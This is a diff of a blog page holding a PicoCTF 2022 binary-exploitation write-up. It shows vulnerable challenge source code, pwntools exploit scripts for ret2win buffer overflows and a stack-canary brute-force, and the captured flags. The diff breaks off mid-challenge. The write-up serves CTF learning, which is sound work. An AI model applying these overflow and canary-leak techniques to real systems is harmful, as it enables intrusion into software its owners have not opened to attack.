@@ -4,7 +4,7 @@
     <title>[PICOCTF] Binary Exploitation // Tzion</title>
     <link rel="shortcut icon" href="/favicon.ico" />
     <meta charset="utf-8" />
-    <meta name="generator" content="Hugo 0.68.3" />
+    <meta name="generator" content="Hugo 0.104.1" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <meta name="author" content="Tzion" />
     <meta name="description" content="" />
@@ -24,9 +24,10 @@ Worth to note that we managed to get rank 468 out of 7794 teams in PicoCTF 2022.
 basic-file-exploit Description The program provided allows you to write to a file and read what you wrote from it. Try playing around with it and see if you can break it!
 This challenge provided a C source code:" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://tzion0.github.io/posts/picoctf2022-binexp/" />
+<meta property="og:url" content="https://tzion0.github.io/posts/picoctf2022-binexp/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2022-03-28T00:00:00+00:00" />
 <meta property="article:modified_time" content="2022-03-28T00:00:00+00:00" />
+
 
 
   </head>
@@ -104,7 +105,7 @@ This challenge provided a C source code:" />
 <h3 id="description">Description</h3>
 <p>The program provided allows you to write to a file and read what you wrote from it. Try playing around with it and see if you can break it!</p>
 <p>This challenge provided a C source code:</p>
-<pre><code>#include &lt;stdio.h&gt;
+<pre tabindex="0"><code>#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;stdbool.h&gt;
 #include &lt;string.h&gt;
@@ -118,7 +119,7 @@ This challenge provided a C source code:" />
 #define WAIT 60
 
 
-static const char* flag = &quot;[REDACTED]&quot;;
+static const char* flag = &#34;[REDACTED]&#34;;
 
 static char data[10][100];
 static int input_lengths[10];
@@ -135,7 +136,7 @@ int tgetinput(char *input, unsigned int l)
     
     if( l &lt;= 0 )
     {
-      printf(&quot;'l' for tgetinput must be greater than 0\n&quot;);
+      printf(&#34;&#39;l&#39; for tgetinput must be greater than 0\n&#34;);
       return -2;
     }
     
@@ -160,24 +161,24 @@ int tgetinput(char *input, unsigned int l)
 
     if (ready_for_reading == -1) {
         /* Some error has occured in input */
-        printf(&quot;Unable to read your input\n&quot;);
+        printf(&#34;Unable to read your input\n&#34;);
         return -1;
     } 
 
     if (ready_for_reading) {
         read_bytes = read(0, input, l-1);
-        if(input[read_bytes-1]=='\n'){
+        if(input[read_bytes-1]==&#39;\n&#39;){
         --read_bytes;
-        input[read_bytes]='\0';
+        input[read_bytes]=&#39;\0&#39;;
         }
         if(read_bytes==0){
-            printf(&quot;No data given.\n&quot;);
+            printf(&#34;No data given.\n&#34;);
             return -4;
         } else {
             return 0;
         }
     } else {
-        printf(&quot;Timed out waiting for user input. Press Ctrl-C to disconnect\n&quot;);
+        printf(&#34;Timed out waiting for user input. Press Ctrl-C to disconnect\n&#34;);
         return -3;
     }
 
@@ -191,27 +192,27 @@ static void data_write() {
   long length;
   int r;
   
-  printf(&quot;Please enter your data:\n&quot;);
+  printf(&#34;Please enter your data:\n&#34;);
   r = tgetinput(input, 100);
   // Timeout on user input
   if(r == -3)
   {
-    printf(&quot;Goodbye!\n&quot;);
+    printf(&#34;Goodbye!\n&#34;);
     exit(0);
   }
   
   while (true) {
-    printf(&quot;Please enter the length of your data:\n&quot;);
+    printf(&#34;Please enter the length of your data:\n&#34;);
     r = tgetinput(len, 4);
     // Timeout on user input
     if(r == -3)
     {
-      printf(&quot;Goodbye!\n&quot;);
+      printf(&#34;Goodbye!\n&#34;);
       exit(0);
     }
   
     if ((length = strtol(len, NULL, 10)) == 0) {
-      puts(&quot;Please put in a valid length&quot;);
+      puts(&#34;Please put in a valid length&#34;);
     } else {
       break;
     }
@@ -224,7 +225,7 @@ static void data_write() {
   strcpy(data[inputs], input);
   input_lengths[inputs] = length;
 
-  printf(&quot;Your entry number is: %d\n&quot;, inputs + 1);
+  printf(&#34;Your entry number is: %d\n&#34;, inputs + 1);
   inputs++;
 }
 
@@ -235,14 +236,14 @@ static void data_read() {
   char output[100];
   int r;
 
-  memset(output, '\0', 100);
+  memset(output, &#39;\0&#39;, 100);
   
-  printf(&quot;Please enter the entry number of your data:\n&quot;);
+  printf(&#34;Please enter the entry number of your data:\n&#34;);
   r = tgetinput(entry, 4);
   // Timeout on user input
   if(r == -3)
   {
-    printf(&quot;Goodbye!\n&quot;);
+    printf(&#34;Goodbye!\n&#34;);
     exit(0);
   }
   
@@ -259,48 +260,48 @@ static void data_read() {
 
 
 int main(int argc, char** argv) {
-  char input[3] = {'\0'};
+  char input[3] = {&#39;\0&#39;};
   long command;
   int r;
 
-  puts(&quot;Hi, welcome to my echo chamber!&quot;);
-  puts(&quot;Type '1' to enter a phrase into our database&quot;);
-  puts(&quot;Type '2' to echo a phrase in our database&quot;);
-  puts(&quot;Type '3' to exit the program&quot;);
+  puts(&#34;Hi, welcome to my echo chamber!&#34;);
+  puts(&#34;Type &#39;1&#39; to enter a phrase into our database&#34;);
+  puts(&#34;Type &#39;2&#39; to echo a phrase in our database&#34;);
+  puts(&#34;Type &#39;3&#39; to exit the program&#34;);
 
   while (true) {   
     r = tgetinput(input, 3);
     // Timeout on user input
     if(r == -3)
     {
-      printf(&quot;Goodbye!\n&quot;);
+      printf(&#34;Goodbye!\n&#34;);
       exit(0);
     }
     
     if ((command = strtol(input, NULL, 10)) == 0) {
-      puts(&quot;Please put in a valid number&quot;);
+      puts(&#34;Please put in a valid number&#34;);
     } else if (command == 1) {
       data_write();
-      puts(&quot;Write successful, would you like to do anything else?&quot;);
+      puts(&#34;Write successful, would you like to do anything else?&#34;);
     } else if (command == 2) {
       if (inputs == 0) {
-        puts(&quot;No data yet&quot;);
+        puts(&#34;No data yet&#34;);
         continue;
       }
       data_read();
-      puts(&quot;Read successful, would you like to do anything else?&quot;);
+      puts(&#34;Read successful, would you like to do anything else?&#34;);
     } else if (command == 3) {
       return 0;
     } else {
-      puts(&quot;Please type either 1, 2 or 3&quot;);
-      puts(&quot;Maybe breaking boundaries elsewhere will be helpful&quot;);
+      puts(&#34;Please type either 1, 2 or 3&#34;);
+      puts(&#34;Maybe breaking boundaries elsewhere will be helpful&#34;);
     }
   }
 
   return 0;
 }
 </code></pre><p>We can see that to read the data, we need to provide an entry number and the value we provided will be passing through this check:</p>
-<pre><code>if ((entry_number = strtol(entry, NULL, 10)) == 0) {
+<pre tabindex="0"><code>if ((entry_number = strtol(entry, NULL, 10)) == 0) {
 	puts(flag);
 	fseek(stdin, 0, SEEK_END);
 	exit(0);
@@ -308,20 +309,20 @@ int main(int argc, char** argv) {
 </code></pre><p>With that being said, we just need to make the return value to be 0, and it can be easily achieve by inputting string instead of number.</p>
 <p><img src="/img/picoctf2022-binexp/bfe.png" alt="IMG"></p>
 <p>Flag:</p>
-<pre><code>picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_149F090A}
+<pre tabindex="0"><code>picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_149F090A}
 </code></pre><h2 id="cve-xxxx-xxxx">CVE-XXXX-XXXX</h2>
 <h3 id="description-1">Description</h3>
 <p>The CVE we&rsquo;re looking for is the first recorded remote code execution (RCE) vulnerability in 2021 in the Windows Print Spooler Service, which is available across desktop and server versions of Windows operating systems. The service is used to manage printers and print servers.</p>
 <p>We just need to look for the CVE and then enter as the flag with the following format:</p>
-<pre><code>picoCTF{CVE-XXXX-XXXXX}
+<pre tabindex="0"><code>picoCTF{CVE-XXXX-XXXXX}
 </code></pre><p>A bit of google shows us the CVE is <strong>CVE-2021-34527</strong>.</p>
 <p>Flag:</p>
-<pre><code>picoCTF{CVE-2021-34527}
+<pre tabindex="0"><code>picoCTF{CVE-2021-34527}
 </code></pre><h2 id="buffer-overflow-0">buffer overflow 0</h2>
 <h3 id="description-2">Description</h3>
 <p>Smash the stack Let&rsquo;s start off simple, can you overflow the correct buffer?</p>
 <p>This challenge provided a binary and its C source code:</p>
-<pre><code>#include &lt;stdio.h&gt;
+<pre tabindex="0"><code>#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;string.h&gt;
 #include &lt;signal.h&gt;
@@ -331,7 +332,7 @@ int main(int argc, char** argv) {
 char flag[FLAGSIZE_MAX];
 
 void sigsegv_handler(int sig) {
-  printf(&quot;%s\n&quot;, flag);
+  printf(&#34;%s\n&#34;, flag);
   fflush(stdout);
   exit(1);
 }
@@ -343,10 +344,10 @@ void vuln(char *input){
 
 int main(int argc, char **argv){
   
-  FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
+  FILE *f = fopen(&#34;flag.txt&#34;,&#34;r&#34;);
   if (f == NULL) {
-    printf(&quot;%s %s&quot;, &quot;Please create 'flag.txt' in this directory with your&quot;,
-                    &quot;own debugging flag.\n&quot;);
+    printf(&#34;%s %s&#34;, &#34;Please create &#39;flag.txt&#39; in this directory with your&#34;,
+                    &#34;own debugging flag.\n&#34;);
     exit(0);
   }
   
@@ -357,39 +358,39 @@ int main(int argc, char **argv){
   setresgid(gid, gid, gid);
 
 
-  printf(&quot;Input: &quot;);
+  printf(&#34;Input: &#34;);
   fflush(stdout);
   char buf1[100];
   gets(buf1); 
   vuln(buf1);
-  printf(&quot;The program will exit now\n&quot;);
+  printf(&#34;The program will exit now\n&#34;);
   return 0;
 }
 </code></pre><p>It looks like it will print out the flag when it encounter SIGSEGV signal. So let&rsquo;s try it:</p>
 <p><img src="/img/picoctf2022-binexp/bof0.png" alt="IMG"></p>
 <p>Flag:</p>
-<pre><code>picoCTF{ov3rfl0ws_ar3nt_that_bad_a065d5d9}
+<pre tabindex="0"><code>picoCTF{ov3rfl0ws_ar3nt_that_bad_a065d5d9}
 </code></pre><h2 id="buffer-overflow-1">buffer overflow 1</h2>
 <h3 id="description-3">Description</h3>
 <p>Control the return address
 Now we&rsquo;re cooking! You can overflow the buffer and return to the flag function in the program.</p>
 <p>This challenge provided a binary and its C source code:</p>
-<pre><code>#include &lt;stdio.h&gt;
+<pre tabindex="0"><code>#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;string.h&gt;
 #include &lt;unistd.h&gt;
 #include &lt;sys/types.h&gt;
-#include &quot;asm.h&quot;
+#include &#34;asm.h&#34;
 
 #define BUFSIZE 32
 #define FLAGSIZE 64
 
 void win() {
   char buf[FLAGSIZE];
-  FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
+  FILE *f = fopen(&#34;flag.txt&#34;,&#34;r&#34;);
   if (f == NULL) {
-    printf(&quot;%s %s&quot;, &quot;Please create 'flag.txt' in this directory with your&quot;,
-                    &quot;own debugging flag.\n&quot;);
+    printf(&#34;%s %s&#34;, &#34;Please create &#39;flag.txt&#39; in this directory with your&#34;,
+                    &#34;own debugging flag.\n&#34;);
     exit(0);
   }
 
@@ -401,7 +402,7 @@ void vuln(){
   char buf[BUFSIZE];
   gets(buf);
 
-  printf(&quot;Okay, time to return... Fingers Crossed... Jumping to 0x%x\n&quot;, get_return_address());
+  printf(&#34;Okay, time to return... Fingers Crossed... Jumping to 0x%x\n&#34;, get_return_address());
 }
 
 int main(int argc, char **argv){
@@ -411,19 +412,19 @@ int main(int argc, char **argv){
   gid_t gid = getegid();
   setresgid(gid, gid, gid);
 
-  puts(&quot;Please enter your string: &quot;);
+  puts(&#34;Please enter your string: &#34;);
   vuln();
   return 0;
 }
 </code></pre><p>From the source code we can see it is a typical ret2win challenge, we just need to overflow the binary then return to the <code>win()</code> function.</p>
 <p>I created a script using pwntools ROP object to easily control the return function:</p>
-<pre><code>from pwn import *
+<pre tabindex="0"><code>from pwn import *
 
 # Allows you to switch between local/GDB/remote from terminal
 def start(argv=[], *a, **kw):
     if args.GDB:  # Set GDBscript below
         return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
-    elif args.REMOTE:  # ('server', 'port')
+    elif args.REMOTE:  # (&#39;server&#39;, &#39;port&#39;)
         return remote(sys.argv[1], sys.argv[2], *a, **kw)
     else:  # Run locally
         return process([exe] + argv, *a, **kw)
@@ -432,18 +433,18 @@ def start(argv=[], *a, **kw):
 # Specify your GDB script here for debugging
 # GDB will be launched if the exploit is run via e.g.
 # ./exploit.py GDB
-gdbscript = '''
+gdbscript = &#39;&#39;&#39;
 init-pwndbg
 continue
-'''.format(**locals())
+&#39;&#39;&#39;.format(**locals())
 
 
 # Set up pwntools for the correct architecture
-exe = './vuln'
+exe = &#39;./vuln&#39;
 # This will automatically get context arch, bits, os etc
 elf = context.binary = ELF(exe, checksec=False)
 # Change logging level to help with debugging (error/warning/info/debug)
-context.log_level = 'INFO'
+context.log_level = &#39;INFO&#39;
 
 # ===========================================================
 #                    EXPLOIT GOES HERE
@@ -452,7 +453,7 @@ context.log_level = 'INFO'
 io = start()
 
 eip_offset = 44 
-info('located EIP offset at {a}'.format(a=eip_offset))
+info(&#39;located EIP offset at {a}&#39;.format(a=eip_offset))
 
 # Create ROP object
 rop = ROP(elf)
@@ -473,25 +474,25 @@ payload = flat({
 })
 
 # Save payload to file
-write('payload', payload)
+write(&#39;payload&#39;, payload)
 
 # Start a new process
 io = start()
 
 # PWN
-io.sendlineafter(b'string:', payload)
+io.sendlineafter(b&#39;string:&#39;, payload)
 
 # Receive the flag
 io.interactive()
 </code></pre><p><img src="/img/picoctf2022-binexp/bof1.png" alt="IMG"></p>
 <p>Flag:</p>
-<pre><code>picoCTF{addr3ss3s_ar3_3asy_ad2f467b}
+<pre tabindex="0"><code>picoCTF{addr3ss3s_ar3_3asy_ad2f467b}
 </code></pre><h2 id="buffer-overflow-2">buffer overflow 2</h2>
 <h3 id="description-4">Description</h3>
 <p>Control the return address and arguments
 This time you&rsquo;ll need to control the arguments to the function you return to!</p>
 <p>This challenge provided a binary and its C source code:</p>
-<pre><code>#include &lt;stdio.h&gt;
+<pre tabindex="0"><code>#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;string.h&gt;
 #include &lt;unistd.h&gt;
@@ -502,10 +503,10 @@ This time you&rsquo;ll need to control the arguments to the function you return 
 
 void win(unsigned int arg1, unsigned int arg2) {
   char buf[FLAGSIZE];
-  FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
+  FILE *f = fopen(&#34;flag.txt&#34;,&#34;r&#34;);
   if (f == NULL) {
-    printf(&quot;%s %s&quot;, &quot;Please create 'flag.txt' in this directory with your&quot;,
-                    &quot;own debugging flag.\n&quot;);
+    printf(&#34;%s %s&#34;, &#34;Please create &#39;flag.txt&#39; in this directory with your&#34;,
+                    &#34;own debugging flag.\n&#34;);
     exit(0);
   }
 
@@ -530,19 +531,19 @@ int main(int argc, char **argv){
   gid_t gid = getegid();
   setresgid(gid, gid, gid);
 
-  puts(&quot;Please enter your string: &quot;);
+  puts(&#34;Please enter your string: &#34;);
   vuln();
   return 0;
 }
 </code></pre><p>From the source code, we can see that this challenge is similar to <strong>buffer overflow 1</strong>. However, instead of just returning to <code>win()</code> function, we also need to pass the function arguments.</p>
 <p>Again, this can be easily done using ROP object provided by pwntools:</p>
-<pre><code>from pwn import *
+<pre tabindex="0"><code>from pwn import *
 
 # Allows you to switch between local/GDB/remote from terminal
 def start(argv=[], *a, **kw):
     if args.GDB:  # Set GDBscript below
         return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
-    elif args.REMOTE:  # ('server', 'port')
+    elif args.REMOTE:  # (&#39;server&#39;, &#39;port&#39;)
         return remote(sys.argv[1], sys.argv[2], *a, **kw)
     else:  # Run locally
         return process([exe] + argv, *a, **kw)
@@ -550,17 +551,17 @@ def start(argv=[], *a, **kw):
 # Specify your GDB script here for debugging
 # GDB will be launched if the exploit is run via e.g.
 # ./exploit.py GDB
-gdbscript = '''
+gdbscript = &#39;&#39;&#39;
 init-pwndbg
 continue
-'''.format(**locals())
+&#39;&#39;&#39;.format(**locals())
 
 # Set up pwntools for the correct architecture
-exe = './vuln'
+exe = &#39;./vuln&#39;
 # This will automatically get context arch, bits, os etc
 elf = context.binary = ELF(exe, checksec=False)
 # Change logging level to help with debugging (error/warning/info/debug)
-context.log_level = 'error'
+context.log_level = &#39;error&#39;
 
 # ===========================================================
 #                    EXPLOIT GOES HERE
@@ -569,7 +570,7 @@ context.log_level = 'error'
 io = start()
 
 eip_offset = 112 
-info('located EIP offset at {a}'.format(a=eip_offset))
+info(&#39;located EIP offset at {a}&#39;.format(a=eip_offset))
 
 # Create ROP object
 rop = ROP(elf)
@@ -586,25 +587,25 @@ payload = flat({
 })
 
 # Save payload to file
-write('payload', payload)
+write(&#39;payload&#39;, payload)
 
 # Start a new process
 io = start()
 
 # PWN
-io.sendlineafter(b'string: \n', payload)
+io.sendlineafter(b&#39;string: \n&#39;, payload)
 
 # Receive the flag
 io.interactive()
 </code></pre><p><img src="/img/picoctf2022-binexp/bof2.png" alt="IMG"></p>
 <p>Flag:</p>
-<pre><code>picoCTF{argum3nt5_4_d4yZ_b3fd8f66}
+<pre tabindex="0"><code>picoCTF{argum3nt5_4_d4yZ_b3fd8f66}
 </code></pre><h2 id="buffer-overflow-3">buffer overflow 3</h2>
 <h3 id="description-5">Description</h3>
 <p>Do you think you can bypass the protection and get the flag?
 It looks like Dr. Oswal added a stack canary to this program to protect against buffer overflows.</p>
 <p>This challenge provided a binary and its C source code:</p>
-<pre><code>#include &lt;stdio.h&gt;
+<pre tabindex="0"><code>#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;string.h&gt;
 #include &lt;unistd.h&gt;
@@ -618,10 +619,10 @@ It looks like Dr. Oswal added a stack canary to this program to protect against 
 
 void win() {
   char buf[FLAGSIZE];
-  FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
+  FILE *f = fopen(&#34;flag.txt&#34;,&#34;r&#34;);
   if (f == NULL) {
-    printf(&quot;%s %s&quot;, &quot;Please create 'flag.txt' in this directory with your&quot;,
-                    &quot;own debugging flag.\n&quot;);
+    printf(&#34;%s %s&#34;, &#34;Please create &#39;flag.txt&#39; in this directory with your&#34;,
+                    &#34;own debugging flag.\n&#34;);
     exit(0);
   }
 
@@ -632,10 +633,10 @@ void win() {
 
 char global_canary[CANARY_SIZE];
 void read_canary() {
-  FILE *f = fopen(&quot;canary.txt&quot;,&quot;r&quot;);
+  FILE *f = fopen(&#34;canary.txt&#34;,&#34;r&#34;);
   if (f == NULL) {
-    printf(&quot;%s %s&quot;, &quot;Please create 'canary.txt' in this directory with your&quot;,
-                    &quot;own debugging canary.\n&quot;);
+    printf(&#34;%s %s&#34;, &#34;Please create &#39;canary.txt&#39; in this directory with your&#34;,
+                    &#34;own debugging canary.\n&#34;);
     exit(0);
   }
 
@@ -650,22 +651,22 @@ void vuln(){
    int count;
    int x = 0;
    memcpy(canary,global_canary,CANARY_SIZE);
-   printf(&quot;How Many Bytes will You Write Into the Buffer?\n&gt; &quot;);
+   printf(&#34;How Many Bytes will You Write Into the Buffer?\n&gt; &#34;);
    while (x&lt;BUFSIZE) {
       read(0,length+x,1);
-      if (length[x]=='\n') break;
+      if (length[x]==&#39;\n&#39;) break;
       x++;
    }
-   sscanf(length,&quot;%d&quot;,&amp;count);
+   sscanf(length,&#34;%d&#34;,&amp;count);
 
-   printf(&quot;Input&gt; &quot;);
+   printf(&#34;Input&gt; &#34;);
    read(0,buf,count);
 
    if (memcmp(canary,global_canary,CANARY_SIZE)) {
-      printf(&quot;***** Stack Smashing Detected ***** : Canary Value Corrupt!\n&quot;); // crash immediately
+      printf(&#34;***** Stack Smashing Detected ***** : Canary Value Corrupt!\n&#34;); // crash immediately
       exit(-1);
    }
-   printf(&quot;Ok... Now Where's the Flag?\n&quot;);
+   printf(&#34;Ok... Now Where&#39;s the Flag?\n&#34;);
    fflush(stdout);
 }
 
@@ -683,7 +684,7 @@ int main(int argc, char **argv){
 }
 </code></pre><p>From the source code we can see it implemented canary, the canary is read from <code>canary.txt</code> with the size of 4 characters/bytes. To bruteforce it, there will be like 2^32 possible of values, which is 4 billion of possibilities.</p>
 <p>Now, there is a smart way to bruteforce it without needing to go through 4 billion of possibilities. In the <code>vuln()</code> function, we can see it read our input using <code>read(0,buf,count);</code>, where the function do not append a NULL byte to the end of our input buffer, unlike <code>scanf()</code>. So what that means is that we can reduce the possibilities to 4 set of 256 characters which are a total of 1024 tries, by appending character by character. For example:</p>
-<pre><code>a    (Stack Smash!)
+<pre tabindex="0"><code>a    (Stack Smash!)
 b    (Stack Smash!)
 c    (Stack Smash!)
 d    (No Stack Smash!)
@@ -695,7 +696,7 @@ dea  (No Stack Smash!)
 deaa (Stack Smash!)
 </code></pre><p>Also, keep in mind that we cannot include Carriage Return (<code>\r</code>) or Line Feed (<code>\n</code>) in our input buffer, else it will stop the <code>read()</code> function.</p>
 <p>Below is the script that will leak the canary from server, notice that we use <code>send()</code> instead of <code>sendline()</code>:</p>
-<pre><code>#!/usr/bin/env python3
+<pre tabindex="0"><code>#!/usr/bin/env python3
 from pwn import *
 from time import sleep
 from itertools import permutations
@@ -705,24 +706,24 @@ import time
 def start(argv=[], *a, **kw):
     if args.GDB:  # Set GDBscript below
         return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
-    elif args.REMOTE:  # ('server', 'port')
+    elif args.REMOTE:  # (&#39;server&#39;, &#39;port&#39;)
         return remote(sys.argv[1], sys.argv[2], *a, **kw)
     else:  # Run locally
         return process([exe] + argv, *a, **kw)
 
 
 # Specify your GDB script here for debugging
-gdbscript = '''
+gdbscript = &#39;&#39;&#39;
 init-pwndbg
 continue
-'''.format(**locals())
+&#39;&#39;&#39;.format(**locals())
 
 # Set up pwntools for the correct architecture
-exe = './vuln'
+exe = &#39;./vuln&#39;
 # This will automatically get context arch, bits, os etc
 elf = context.binary = ELF(exe, checksec=False)
 # Enable verbose logging so we can see exactly what is being sent (info/debug)
-context.log_level = 'error'
+context.log_level = &#39;error&#39;
 
 # ===========================================================
 #                    EXPLOIT GOES HERE
@@ -732,7 +733,7 @@ context.log_level = 'error'
 pad1 = 64
 
 # The stored values from the leaked canary
-canary = ['A', 'A', 'A', 'A']
+canary = [&#39;A&#39;, &#39;A&#39;, &#39;A&#39;, &#39;A&#39;]
 
 # loop through all 4 entries of the canary
 for i in range(4):
@@ -740,11 +741,11 @@ for i in range(4):
     for c in range(255):    
         p = start();
         p.recv()
-        p.sendline(b&quot;-1&quot;); 
+        p.sendline(b&#34;-1&#34;); 
         p.recv()
 
-        payload = b&quot;A&quot; * pad1 # initial padding
-        payload += &quot;&quot;.join(canary[0:i]).encode() # the canary we've leaked so far
+        payload = b&#34;A&#34; * pad1 # initial padding
+        payload += &#34;&#34;.join(canary[0:i]).encode() # the canary we&#39;ve leaked so far
         payload += chr(c).encode() # the new character to try
         print(payload)
         p.send(payload)
@@ -752,59 +753,59 @@ for i in range(4):
         p.close()
 
         # Check the output
-        if b'Stack Smash' not in recv:
+        if b&#39;Stack Smash&#39; not in recv:
             canary[i] = chr(c) # add the found value
             break
 
-print(&quot;&quot;.join(canary))
+print(&#34;&#34;.join(canary))
 </code></pre><p><img src="/img/picoctf2022-binexp/bof3-leak_canary.png" alt="IMG"></p>
 <p>From the picture we can see we leaked the canary, now we just need to carefully assemble the structure of our payload:</p>
-<pre><code>from pwn import *
+<pre tabindex="0"><code>from pwn import *
 
 # Allows you to switch between local/GDB/remote from terminal
 def start(argv=[], *a, **kw):
     if args.GDB:  # Set GDBscript below
         return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
-    elif args.REMOTE:  # ('server', 'port')
+    elif args.REMOTE:  # (&#39;server&#39;, &#39;port&#39;)
         return remote(sys.argv[1], sys.argv[2], *a, **kw)
     else:  # Run locally
         return process([exe] + argv, *a, **kw)
 
 
 # Specify your GDB script here for debugging
-gdbscript = '''
+gdbscript = &#39;&#39;&#39;
 init-pwndbg
 continue
-'''.format(**locals())
+&#39;&#39;&#39;.format(**locals())
 
 # Set up pwntools for the correct architecture
-exe = './vuln'
+exe = &#39;./vuln&#39;
 # This will automatically get context arch, bits, os etc
 elf = context.binary = ELF(exe, checksec=False)
 # Enable verbose logging so we can see exactly what is being sent (info/debug)
-context.log_level = 'error'
+context.log_level = &#39;error&#39;
 
 # ===========================================================
 #                    EXPLOIT GOES HERE
 # ===========================================================
 
 # canary token leaked by using leak_canary.py
-canry = b&quot;BiRd&quot; 
+canry = b&#34;BiRd&#34; 
 
 # Start program
 io = start()
 
 offset = 64  # Canary offset
 
-io.sendlineafter(b'&gt; ', b'-1')
+io.sendlineafter(b&#39;&gt; &#39;, b&#39;-1&#39;)
 
-io.recvuntil(b'Input&gt; ')
+io.recvuntil(b&#39;Input&gt; &#39;)
 
 # Build payload (return to win)
 payload = flat([
-    offset * b'A',  # Pad to canary (64)
+    offset * b&#39;A&#39;,  # Pad to canary (64)
     canry,  # Our leaked canary (4)
-    16 * b'A',  # Pad to Ret pointer (8)
+    16 * b&#39;A&#39;,  # Pad to Ret pointer (8)
     elf.symbols.win  # Jmp to win function
 ])
 
@@ -816,12 +817,12 @@ print(io.recv())
 
 io.interactive()
 </code></pre><p>Flag:</p>
-<pre><code>picoCTF{Stat1C_c4n4r13s_4R3_b4D_f9792127}
+<pre tabindex="0"><code>picoCTF{Stat1C_c4n4r13s_4R3_b4D_f9792127}
 </code></pre><h2 id="rps">RPS</h2>
 <h3 id="description-6">Description</h3>
 <p>Here&rsquo;s a program that plays rock, paper, scissors against you. I hear something good happens if you win 5 times in a row.</p>
 <p>This challenge provided a C source code:</p>
-<pre><code>#include &lt;stdio.h&gt;
+<pre tabindex="0"><code>#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;stdbool.h&gt;
 #include &lt;string.h&gt;
@@ -835,10 +836,10 @@ io.interactive()
 
 
 
-static const char* flag = &quot;[REDACTED]&quot;;
+static const char* flag = &#34;[REDACTED]&#34;;
 
-char* hands[3] = {&quot;rock&quot;, &quot;paper&quot;, &quot;scissors&quot;};
-char* loses[3] = {&quot;paper&quot;, &quot;scissors&quot;, &quot;rock&quot;};
+char* hands[3] = {&#34;rock&#34;, &#34;paper&#34;, &#34;scissors&#34;};
+char* loses[3] = {&#34;paper&#34;, &#34;scissors&#34;, &#34;rock&#34;};
 int wins = 0;
 
 
@@ -852,7 +853,7 @@ int tgetinput(char *input, unsigned int l)
     
     if( l &lt;= 0 )
     {
-      printf(&quot;'l' for tgetinput must be greater than 0\n&quot;);
+      printf(&#34;&#39;l&#39; for tgetinput must be greater than 0\n&#34;);
       return -2;
     }
     
@@ -877,24 +878,24 @@ int tgetinput(char *input, unsigned int l)
 
     if (ready_for_reading == -1) {
         /* Some error has occured in input */
-        printf(&quot;Unable to read your input\n&quot;);
+        printf(&#34;Unable to read your input\n&#34;);
         return -1;
     } 
 
     if (ready_for_reading) {
         read_bytes = read(0, input, l-1);
-        if(input[read_bytes-1]=='\n'){
+        if(input[read_bytes-1]==&#39;\n&#39;){
         --read_bytes;
-        input[read_bytes]='\0';
+        input[read_bytes]=&#39;\0&#39;;
         }
         if(read_bytes==0){
-            printf(&quot;No data given.\n&quot;);
+            printf(&#34;No data given.\n&#34;);
             return -4;
         } else {
             return 0;
         }
     } else {
-        printf(&quot;Timed out waiting for user input. Press Ctrl-C to disconnect\n&quot;);
+        printf(&#34;Timed out waiting for user input. Press Ctrl-C to disconnect\n&#34;);
         return -3;
     }
 
@@ -907,54 +908,54 @@ bool play () {
   srand(time(0));
   int r;
 
-  printf(&quot;Please make your selection (rock/paper/scissors):\n&quot;);
+  printf(&#34;Please make your selection (rock/paper/scissors):\n&#34;);
   r = tgetinput(player_turn, 100);
   // Timeout on user input
   if(r == -3)
   {
-    printf(&quot;Goodbye!\n&quot;);
+    printf(&#34;Goodbye!\n&#34;);
     exit(0);
   }
 
   int computer_turn = rand() % 3;
-  printf(&quot;You played: %s\n&quot;, player_turn);
-  printf(&quot;The computer played: %s\n&quot;, hands[computer_turn]);
+  printf(&#34;You played: %s\n&#34;, player_turn);
+  printf(&#34;The computer played: %s\n&#34;, hands[computer_turn]);
 
   if (strstr(player_turn, loses[computer_turn])) {
-    puts(&quot;You win! Play again?&quot;);
+    puts(&#34;You win! Play again?&#34;);
     return true;
   } else {
-    puts(&quot;Seems like you didn't win this time. Play again?&quot;);
+    puts(&#34;Seems like you didn&#39;t win this time. Play again?&#34;);
     return false;
   }
 }
 
 
 int main () {
-  char input[3] = {'\0'};
+  char input[3] = {&#39;\0&#39;};
   int command;
   int r;
 
-  puts(&quot;Welcome challenger to the game of Rock, Paper, Scissors&quot;);
-  puts(&quot;For anyone that beats me 5 times in a row, I will offer up a flag I found&quot;);
-  puts(&quot;Are you ready?&quot;);
+  puts(&#34;Welcome challenger to the game of Rock, Paper, Scissors&#34;);
+  puts(&#34;For anyone that beats me 5 times in a row, I will offer up a flag I found&#34;);
+  puts(&#34;Are you ready?&#34;);
   
   while (true) {
-    puts(&quot;Type '1' to play a game&quot;);
-    puts(&quot;Type '2' to exit the program&quot;);
+    puts(&#34;Type &#39;1&#39; to play a game&#34;);
+    puts(&#34;Type &#39;2&#39; to exit the program&#34;);
     r = tgetinput(input, 3);
     // Timeout on user input
     if(r == -3)
     {
-      printf(&quot;Goodbye!\n&quot;);
+      printf(&#34;Goodbye!\n&#34;);
       exit(0);
     }
     
     if ((command = strtol(input, NULL, 10)) == 0) {
-      puts(&quot;Please put in a valid number&quot;);
+      puts(&#34;Please put in a valid number&#34;);
       
     } else if (command == 1) {
-      printf(&quot;\n\n&quot;);
+      printf(&#34;\n\n&#34;);
       if (play()) {
         wins++;
       } else {
@@ -962,36 +963,36 @@ int main () {
       }
 
       if (wins &gt;= 5) {
-        puts(&quot;Congrats, here's the flag!&quot;);
+        puts(&#34;Congrats, here&#39;s the flag!&#34;);
         puts(flag);
       }
     } else if (command == 2) {
